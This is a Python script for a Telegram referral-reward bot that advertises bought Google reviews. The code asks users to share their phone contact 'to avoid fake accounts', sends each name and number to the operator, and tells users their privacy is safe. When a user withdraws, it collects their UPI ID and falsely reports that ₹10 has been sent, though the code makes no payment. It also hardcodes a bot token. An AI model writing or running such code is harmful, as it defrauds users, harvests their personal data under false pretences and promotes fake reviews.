import telebot
import logging
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from collections import defaultdict
import json
import os

# Bot token and admin chat ID
BOT_TOKEN = "7935524751:AAHJdqIt7Xu-gc-b80iUh1YW9fVAEjgcXj0"
YOUR_CHAT_ID = "6404584544"  # Admin chat ID

bot = telebot.TeleBot(BOT_TOKEN)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger()

# In-memory storage
user_balances = defaultdict(int)
user_referrals = defaultdict(int)
user_bonus_received = defaultdict(bool)
user_join_status = defaultdict(bool)
user_first_claim = defaultdict(bool)
user_ids = set()

DATA_FILE = 'bot_data.json'

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({
                "user_balances": dict(user_balances),
                "user_referrals": dict(user_referrals),
                "user_bonus_received": dict(user_bonus_received),
                "user_first_claim": dict(user_first_claim),
                "user_ids": list(user_ids)
            }, f)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def load_data():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                user_balances.update({int(k): v for k, v in data.get("user_balances", {}).items()})
                user_referrals.update({int(k): v for k, v in data.get("user_referrals", {}).items()})
                user_bonus_received.update({int(k): v for k, v in data.get("user_bonus_received", {}).items()})
                user_first_claim.update({int(k): v for k, v in data.get("user_first_claim", {}).items()})
                user_ids.update(set(map(int, data.get("user_ids", []))))
        except Exception as e:
            logger.error(f"Error loading data: {e}")

load_data()

def send_telegram_message(contact_info, phone_number, first_name, last_name):
    phone_link = f"<a href='tel:{phone_number}'>{phone_number}</a>"
    name_mono = f"<code>{first_name} {last_name}</code>"
    message = f"New Contact Info Received:\nName: {name_mono}\nPhone: {phone_link}\n\nClick to copy: <code>{phone_number}</code>"
    bot.send_message(YOUR_CHAT_ID, message, parse_mode='HTML')

def send_reply_buttons(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.add(
        KeyboardButton("💰Balance"),
        KeyboardButton("✅Withdraw"),
        KeyboardButton("👌Referral Link"),
        KeyboardButton("🎁Bonus"),
        KeyboardButton("🗘 Buy Reviews")
    )
    if str(user_id) == YOUR_CHAT_ID:
        markup.add(KeyboardButton("👑 Admin Panel"))
    bot.send_message(user_id, "Main menu:", reply_markup=markup)

def send_admin_panel(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(
        KeyboardButton("📊 User Count"),
        KeyboardButton("📜 Check Referrals"),
        KeyboardButton("📤 Broadcast"),
        KeyboardButton("📁 Export Data"),
        KeyboardButton("➕ Add Balance"),
        KeyboardButton("➖ Remove Balance")
    )
    markup.add(KeyboardButton("🔙 Back to Main Menu"))
    bot.send_message(user_id, "🔐 *Admin Panel*", parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.chat.id
    user_ids.add(user_id)
    save_data()
    if ' ' in message.text:
        referrer_id = message.text.split()[1]
        if str(user_id) != referrer_id:
            user_referrals[user_id] = referrer_id
            save_data()

    welcome_message = """👋 Hey There! Welcome To Our Bot!
⚠️ Must Join All Channels To Use Our Bot
💥 After Joining Click \"Claim\"
🎁🎁 Click Bonus for Free Bonus 🎁🎁"""
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("Join Channel", url="https://t.me/googlereviews02"),
        InlineKeyboardButton("Join Group", url="https://t.me/google_review_usa")
    )
    markup.add(InlineKeyboardButton("Claim", callback_data='claim'))
    bot.send_message(user_id, welcome_message, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == 'claim')
def after_claim(call):
    user_id = call.message.chat.id
    if not user_first_claim[user_id]:
        user_first_claim[user_id] = True
        save_data()
        bot.send_message(user_id, "❌ Please join the required channel and group first. Then click 'Claim' again.")
    else:
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(KeyboardButton("✅ Share Your Profile", request_contact=True))
        bot.send_message(user_id, "📱 Please share your profile to avoid fake accounts.", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.chat.id
    if message.contact:
        phone_number = message.contact.phone_number
        first_name = message.contact.first_name
        last_name = message.contact.last_name or ""

        contact_info = f"Name: {first_name} {last_name}\nPhone: {phone_number}"
        send_telegram_message(contact_info, phone_number, first_name, last_name)

        bot.send_message(user_id, "Thank you for sharing your contact! Your privacy is safe with us.")
        send_reply_buttons(user_id)
    else:
        bot.send_message(user_id, "⚠️ Please share your contact using the provided button.")

pending_broadcasts = {}

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.chat.id
    text = message.text

    if text == "💰Balance":
        bot.send_message(user_id, f"💼 Your current balance is: ₹{user_balances[user_id]}")

    elif text == "✅Withdraw":
        if user_balances[user_id] >= 10:
            bot.send_message(user_id, "✅ You are eligible to withdraw ₹10. Please enter your UPI ID:")
            bot.register_next_step_handler(message, process_upi_id)
        else:
            bot.send_message(user_id, "❌ Minimum ₹10 required to withdraw.")

    elif text == "👌Referral Link":
        referral_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        bot.send_message(user_id, f"🔗 Share this referral link with friends to earn:\n{referral_link}")

    elif text == "🎁Bonus":
        if not user_bonus_received[user_id]:
            user_balances[user_id] += 1
            user_bonus_received[user_id] = True
            referrer_id = user_referrals.get(user_id)
            if referrer_id:
                user_balances[int(referrer_id)] += 1
                bot.send_message(int(referrer_id), "🎉 You earned ₹1 from your referral!")
            save_data()
            bot.send_message(user_id, "🎉 You received ₹1 bonus!")
            bot.send_message(user_id, f"Updated Balance: ₹{user_balances[user_id]}")
        else:
            bot.send_message(user_id, "🎁 Bonus already claimed.")

    elif text == "🗘 Buy Reviews":
        bot.send_message(user_id, "We provide reviews for various platforms! 🎉\n\nContact: 👉 @itsmeryzen")

    elif text == "👑 Admin Panel" and str(user_id) == YOUR_CHAT_ID:
        send_admin_panel(user_id)

    elif text == "➕ Add Balance" and str(user_id) == YOUR_CHAT_ID:
        bot.send_message(user_id, "Send user ID and amount (format: `user_id amount`)", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_add_balance_step)

    elif text == "➖ Remove Balance" and str(user_id) == YOUR_CHAT_ID:
        bot.send_message(user_id, "Send user ID and amount to deduct (format: `user_id amount`)", parse_mode="Markdown")
        bot.register_next_step_handler(message, process_remove_balance_step)

    elif text == "📊 User Count" and str(user_id) == YOUR_CHAT_ID:
        bot.send_message(user_id, f"👥 Total Users: {len(user_ids)}")

    elif text == "📜 Check Referrals" and str(user_id) == YOUR_CHAT_ID:
        bot.send_message(user_id, "Enter the user ID to check referrals (or type 'all' to see all):")
        bot.register_next_step_handler(message, check_specific_referrals)

    elif text == "📤 Broadcast" and str(user_id) == YOUR_CHAT_ID:
        msg = bot.send_message(user_id, "📨 Send your broadcast message:")
        bot.register_next_step_handler(msg, confirm_broadcast)

    elif text == "📁 Export Data" and str(user_id) == YOUR_CHAT_ID:
        with open(DATA_FILE, 'rb') as f:
            bot.send_document(user_id, f)

    elif text == "🔙 Back to Main Menu":
        send_reply_buttons(user_id)

    else:
        bot.send_message(user_id, "❌ Invalid Option")

def process_upi_id(message):
    user_id = message.chat.id
    upi_id = message.text

    if "@" in upi_id:
        user = bot.get_chat(user_id)
        first_name = user.first_name
        last_name = user.last_name or ""

        details = (
            f"💸 Withdrawal Request\n"
            f"Name: {first_name} {last_name}\n"
            f"Chat ID: {user_id}\n"
            f"UPI ID: <code>{upi_id}</code>\n"
            f"Balance: ₹{user_balances[user_id]}"
        )
        bot.send_message(YOUR_CHAT_ID, details, parse_mode='HTML')
        bot.send_message(user_id, "✅ ₹10 has been sent. Check your UPI account in 1–2 minutes.")
        user_balances[user_id] -= 10
        save_data()
    else:
        bot.send_message(user_id, "❌ Invalid UPI ID. Please include '@' in your ID.")
    send_reply_buttons(user_id)

def process_add_balance_step(message):
    try:
        user_id_str, amount_str = message.text.strip().split()
        user_id = int(user_id_str)
        amount = int(amount_str)
        user_balances[user_id] += amount
        bot.send_message(user_id, f"🎉 Admin added ₹{amount} to your balance! New Balance: ₹{user_balances[user_id]}")
        bot.send_message(YOUR_CHAT_ID, f"✅ ₹{amount} added to user {user_id}.")
        save_data()
    except:
        bot.send_message(YOUR_CHAT_ID, "❌ Error! Use format: `user_id amount`", parse_mode="Markdown")

def process_remove_balance_step(message):
    try:
        user_id_str, amount_str = message.text.strip().split()
        user_id = int(user_id_str)
        amount = int(amount_str)
        if user_balances[user_id] >= amount:
            user_balances[user_id] -= amount
            bot.send_message(user_id, f"⚠️ Admin removed ₹{amount} from your balance. New Balance: ₹{user_balances[user_id]}")
            bot.send_message(YOUR_CHAT_ID, f"✅ ₹{amount} deducted from user {user_id}.")
            save_data()
        else:
            bot.send_message(YOUR_CHAT_ID, "❌ User has insufficient balance.")
    except:
        bot.send_message(YOUR_CHAT_ID, "❌ Error! Use format: `user_id amount`", parse_mode="Markdown")

def confirm_broadcast(message):
    pending_broadcasts[message.chat.id] = message.text
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Confirm", callback_data="confirm_broadcast"),
        InlineKeyboardButton("❌ Cancel", callback_data="cancel_broadcast")
    )
    bot.send_message(message.chat.id, f"📢 Confirm broadcast message:\n\n{message.text}", reply_markup=markup)

def send_broadcast_message(message_text):
    success = 0
    for uid in user_ids:
        try:
            bot.send_message(uid, message_text)
            success += 1
        except:
            continue
    bot.send_message(YOUR_CHAT_ID, f"📤 Broadcast sent to {success} users.")

@bot.callback_query_handler(func=lambda call: call.data in ["confirm_broadcast", "cancel_broadcast"])
def handle_broadcast_callback(call):
    if call.data == "confirm_broadcast":
        message_text = pending_broadcasts.get(call.message.chat.id)
        if message_text:
            send_broadcast_message(message_text)
            bot.send_message(call.message.chat.id, "✅ Broadcast sent.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ No broadcast message found.")
        pending_broadcasts.pop(call.message.chat.id, None)
    elif call.data == "cancel_broadcast":
        pending_broadcasts.pop(call.message.chat.id, None)
        bot.send_message(call.message.chat.id, "❌ Broadcast cancelled.")

def check_specific_referrals(message):
    target_id = message.text.strip()
    if target_id.lower() == "all":
        referred_users = [(uid, ref) for uid, ref in user_referrals.items() if ref]
    else:
        try:
            target_id = int(target_id)
            referred_users = [(uid, ref) for uid, ref in user_referrals.items() if int(ref) == target_id]
        except:
            bot.send_message(message.chat.id, "❌ Invalid ID format.")
            return

    if referred_users:
        message_lines = [
            f"👤 <b>{bot.get_chat(int(uid)).first_name}</b> (ID: <code>{uid}</code>) → Referred By: <code>{ref}</code>"
            for uid, ref in referred_users
        ]
        bot.send_message(message.chat.id, '\n'.join(message_lines), parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "No referrals found.")

bot.polling(none_stop=True)
